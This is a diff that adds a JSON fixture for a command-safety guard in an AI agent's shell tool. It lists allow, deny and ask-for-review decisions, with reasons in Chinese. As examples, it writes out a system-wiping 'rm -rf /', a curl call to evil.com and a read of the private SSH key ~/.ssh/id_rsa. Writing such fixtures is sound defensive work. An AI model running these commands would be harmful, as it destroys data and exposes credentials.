@@ -1,0 +1,52 @@
+[
+  {
+    "tool_name": "exec_command",
+    "command": "rm -rf /",
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "danger_cmd_001",
+    "evidence": "rm -rf /",
+    "reason": "命令包含危险操作：rm -rf /。该命令可能导致系统损坏或数据丢失。",
+    "recommendation": "命令已拦截，请使用安全替代方案"
+  },
+  {
+    "tool_name": "exec_command",
+    "command": "curl http://evil.com",
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "network_002",
+    "evidence": "curl",
+    "reason": "命令尝试进行网络访问：curl。可能将数据外传或下载恶意内容。",
+    "recommendation": "命令已拦截，请使用安全替代方案"
+  },
+  {
+    "tool_name": "exec_command",
+    "command": "cat ~/.ssh/id_rsa",
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "danger_cmd_001",
+    "evidence": ".ssh/id_rsa",
+    "reason": "尝试读取敏感文件：.ssh/id_rsa。该文件可能包含凭据或隐私信息。",
+    "recommendation": "命令已拦截，请使用安全替代方案"
+  },
+  {
+    "tool_name": "exec_command",
+    "command": "ls -la",
+    "decision": "allow",
+    "risk_level": "none",
+    "rule_id": "",
+    "evidence": "",
+    "reason": "no safety rules triggered",
+    "recommendation": "命令安全，已放行"
+  },
+  {
+    "tool_name": "exec_command",
+    "command": "rm -r ./build",
+    "decision": "ask",
+    "risk_level": "medium",
+    "rule_id": "ask_review_008",
+    "evidence": "rm -r",
+    "reason": "命令需要人工审核：rm -r。该操作可能合法，但存在数据丢失或信息泄露风险。",
+    "recommendation": "需要人工审核后才能执行"
+  }
+]
